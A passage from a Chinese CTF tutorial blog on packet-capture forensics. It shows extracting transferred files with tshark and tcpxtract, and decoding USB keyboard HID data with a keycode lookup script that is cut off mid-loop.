</span></span><span class=line><span class=cl>    <span class=n>response_phrase</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>content_type</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.content_type&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=流量分析基础考点><span>流量分析基础考点</span>
<a href=#%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90%e5%9f%ba%e7%a1%80%e8%80%83%e7%82%b9 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=1直接搜索flag明文或者编码过的flag><span>1、直接搜索flag明文或者编码过的flag:</span>
<a href=#1%e7%9b%b4%e6%8e%a5%e6%90%9c%e7%b4%a2flag%e6%98%8e%e6%96%87%e6%88%96%e8%80%85%e7%bc%96%e7%a0%81%e8%bf%87%e7%9a%84flag class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h3 class=heading-element id=2流量包端口隐写可能会有01互换><span>2、流量包端口隐写（可能会有01互换）</span>
<a href=#2%e6%b5%81%e9%87%8f%e5%8c%85%e7%ab%af%e5%8f%a3%e9%9a%90%e5%86%99%e5%8f%af%e8%83%bd%e4%bc%9a%e6%9c%8901%e4%ba%92%e6%8d%a2 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h3 class=heading-element id=3tcpftp协议传输文件binwalk和foremost都没用><span>3、TCP/FTP协议传输文件(binwalk和foremost都没用)：</span>
<a href=#3tcpftp%e5%8d%8f%e8%ae%ae%e4%bc%a0%e8%be%93%e6%96%87%e4%bb%b6binwalk%e5%92%8cforemost%e9%83%bd%e6%b2%a1%e7%94%a8 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. 直接用wireshark导出为pcap文件然后用networkminer分析
</span></span><span class=line><span class=cl>2. 拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap
</span></span><span class=line><span class=cl>3. 直接追踪流提取16进制，根据文件头尾提取出文件</span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=4有时候可能需要根据ip或者版本分类导出><span>4、有时候可能需要根据IP或者版本分类导出</span>
<a href=#4%e6%9c%89%e6%97%b6%e5%80%99%e5%8f%af%e8%83%bd%e9%9c%80%e8%a6%81%e6%a0%b9%e6%8d%aeip%e6%88%96%e8%80%85%e7%89%88%e6%9c%ac%e5%88%86%e7%b1%bb%e5%af%bc%e5%87%ba class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h2 class=heading-element id=usb流量分析><span>USB流量分析</span>
<a href=#usb%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量</p><p>流量包中数据存储的字段有两种：<code>usb.capdata</code> 和 <code>usbhid.data</code></p><h3 class=heading-element id=键盘流量分析><span>键盘流量分析</span>
<a href=#%e9%94%ae%e7%9b%98%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>键盘流量的数据常见的长度为8字节</p></blockquote><p>首先根据数据存储的字段，用<code>tshark</code>提取出数据，注意在有多个IP的情况下要用过滤器分IP提取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tshark -r example.pcapng -Y <span class=s1>&#39;usb.src == &#34;2.3.1&#34;&#39;</span> -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>然后使用脚本根据对照表还原出键盘输入的数据即可</p><blockquote><p>Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的</p><p>因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行</p><p>这里就贴一份的自己写的还原脚本吧</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>normalKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span> <span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span> <span class=s2>&#34;b&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span> <span class=s2>&#34;c&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span> <span class=s2>&#34;d&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span> <span class=s2>&#34;e&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span> <span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=s2>&#34;0a&#34;</span><span class=p>:</span> <span class=s2>&#34;g&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span> <span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span> <span class=s2>&#34;i&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;0d&#34;</span><span class=p>:</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span> <span class=s2>&#34;k&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span> <span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span> <span class=s2>&#34;m&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span> <span class=s2>&#34;n&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span> <span class=s2>&#34;o&#34;</span><span class=p>,</span> <span class=s2>&#34;13&#34;</span><span class=p>:</span> <span class=s2>&#34;p&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span> <span class=s2>&#34;q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;16&#34;</span><span class=p>:</span> <span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span class=p>:</span> <span class=s2>&#34;t&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span> <span class=s2>&#34;u&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span> <span class=s2>&#34;v&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span> <span class=s2>&#34;x&#34;</span><span class=p>,</span> <span class=s2>&#34;1c&#34;</span><span class=p>:</span> <span class=s2>&#34;y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span> <span class=s2>&#34;z&#34;</span><span class=p>,</span> <span class=s2>&#34;1e&#34;</span><span class=p>:</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;1f&#34;</span><span class=p>:</span> <span class=s2>&#34;2&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span> <span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span> <span class=s2>&#34;4&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span> <span class=s2>&#34;5&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span> <span class=s2>&#34;6&#34;</span><span class=p>,</span> <span class=s2>&#34;24&#34;</span><span class=p>:</span> <span class=s2>&#34;7&#34;</span><span class=p>,</span> <span class=s2>&#34;25&#34;</span><span class=p>:</span> <span class=s2>&#34;8&#34;</span><span class=p>,</span> <span class=s2>&#34;26&#34;</span><span class=p>:</span> <span class=s2>&#34;9&#34;</span><span class=p>,</span> <span class=s2>&#34;27&#34;</span><span class=p>:</span> <span class=s2>&#34;0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;28&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;29&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;SPACE&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2d&#34;</span><span class=p>:</span> <span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;2e&#34;</span><span class=p>:</span> <span class=s2>&#34;=&#34;</span><span class=p>,</span> <span class=s2>&#34;2f&#34;</span><span class=p>:</span> <span class=s2>&#34;[&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;30&#34;</span><span class=p>:</span> <span class=s2>&#34;]&#34;</span><span class=p>,</span> <span class=s2>&#34;31&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;33&#34;</span><span class=p>:</span> <span class=s2>&#34;;&#34;</span><span class=p>,</span> <span class=s2>&#34;34&#34;</span><span class=p>:</span> <span class=s2>&#34;&#39;&#34;</span><span class=p>,</span> <span class=s2>&#34;35&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;GA&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;36&#34;</span><span class=p>:</span> <span class=s2>&#34;,&#34;</span><span class=p>,</span> <span class=s2>&#34;37&#34;</span><span class=p>:</span> <span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=s2>&#34;38&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;39&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3b&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3d&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F4&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3e&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F5&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3f&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F6&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;40&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;41&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;42&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;43&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;44&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F11&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;45&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F12&gt;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shiftKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span> <span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span> <span class=s2>&#34;B&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span> <span class=s2>&#34;C&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span> <span class=s2>&#34;D&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span> <span class=s2>&#34;E&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span> <span class=s2>&#34;F&#34;</span><span class=p>,</span><span class=s2>&#34;0a&#34;</span><span class=p>:</span> <span class=s2>&#34;G&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span> <span class=s2>&#34;H&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span> <span class=s2>&#34;I&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;0d&#34;</span><span class=p>:</span> <span class=s2>&#34;J&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span> <span class=s2>&#34;K&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span> <span class=s2>&#34;L&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span> <span class=s2>&#34;M&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span> <span class=s2>&#34;N&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span> <span class=s2>&#34;O&#34;</span><span class=p>,</span><span class=s2>&#34;13&#34;</span><span class=p>:</span> <span class=s2>&#34;P&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span> <span class=s2>&#34;Q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span> <span class=s2>&#34;R&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;16&#34;</span><span class=p>:</span> <span class=s2>&#34;S&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span class=p>:</span> <span class=s2>&#34;T&#34;</span><span class=p>,</span> <span class=s2>&#34;18&#34;</span><span class=p>:</span> <span class=s2>&#34;U&#34;</span><span class=p>,</span> <span class=s2>&#34;19&#34;</span><span class=p>:</span> <span class=s2>&#34;V&#34;</span><span class=p>,</span> <span class=s2>&#34;1a&#34;</span><span class=p>:</span> <span class=s2>&#34;W&#34;</span><span class=p>,</span> <span class=s2>&#34;1b&#34;</span><span class=p>:</span> <span class=s2>&#34;X&#34;</span><span class=p>,</span><span class=s2>&#34;1c&#34;</span><span class=p>:</span> <span class=s2>&#34;Y&#34;</span><span class=p>,</span> <span class=s2>&#34;1d&#34;</span><span class=p>:</span> <span class=s2>&#34;Z&#34;</span><span class=p>,</span> <span class=s2>&#34;1e&#34;</span><span class=p>:</span> <span class=s2>&#34;!&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;1f&#34;</span><span class=p>:</span> <span class=s2>&#34;@&#34;</span><span class=p>,</span> <span class=s2>&#34;20&#34;</span><span class=p>:</span> <span class=s2>&#34;#&#34;</span><span class=p>,</span> <span class=s2>&#34;21&#34;</span><span class=p>:</span> <span class=s2>&#34;$&#34;</span><span class=p>,</span> <span class=s2>&#34;22&#34;</span><span class=p>:</span> <span class=s2>&#34;%&#34;</span><span class=p>,</span> <span class=s2>&#34;23&#34;</span><span class=p>:</span> <span class=s2>&#34;^&#34;</span><span class=p>,</span> <span class=s2>&#34;24&#34;</span><span class=p>:</span> <span class=s2>&#34;&amp;&#34;</span><span class=p>,</span><span class=s2>&#34;25&#34;</span><span class=p>:</span> <span class=s2>&#34;*&#34;</span><span class=p>,</span> <span class=s2>&#34;26&#34;</span><span class=p>:</span> <span class=s2>&#34;(&#34;</span><span class=p>,</span> <span class=s2>&#34;27&#34;</span><span class=p>:</span> <span class=s2>&#34;)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;28&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;RET&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;29&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;ESC&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;2b&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;2c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; SPACE &gt; &#34;</span><span class=p>,</span> <span class=s2>&#34;2d&#34;</span><span class=p>:</span> <span class=s2>&#34;_&#34;</span><span class=p>,</span> <span class=s2>&#34;2e&#34;</span><span class=p>:</span> <span class=s2>&#34; + &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=s2>&#34;2f&#34;</span><span class=p>:</span> <span class=s2>&#34;{&#34;</span><span class=p>,</span> <span class=s2>&#34;30&#34;</span><span class=p>:</span> <span class=s2>&#34;}&#34;</span><span class=p>,</span> <span class=s2>&#34;31&#34;</span><span class=p>:</span> <span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;NON&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;33&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;34&#34;</span><span class=p>:</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;35&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;TILDE&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;36&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;37&#34;</span><span class=p>:</span> <span class=s2>&#34;&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;38&#34;</span><span class=p>:</span> <span class=s2>&#34;?&#34;</span><span class=p>,</span><span class=s2>&#34;39&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3a&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F1&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3b&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F2&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3c&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F3&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;3d&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; F4 &gt; &#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=s2>&#34;3e&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F5 &gt; &#34;</span><span class=p>,</span><span class=s2>&#34;3f&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F6 &gt; &#34;</span><span class=p>,</span><span class=s2>&#34;40&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F7&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;41&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F8&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;42&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F9&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;43&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt;F10&gt;&#34;</span><span class=p>,</span> <span class=s2>&#34;44&#34;</span><span class=p>:</span> <span class=s2>&#34;&lt; F11 &gt; &#34;</span><span class=p>,</span> <span class=s2>&#34;45&#34;</span><span class=p>:</span> <span class=s2>&#34; &lt; F12 &gt; &#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>delete_output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>keys</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>keys</span><span class=p>:</span>
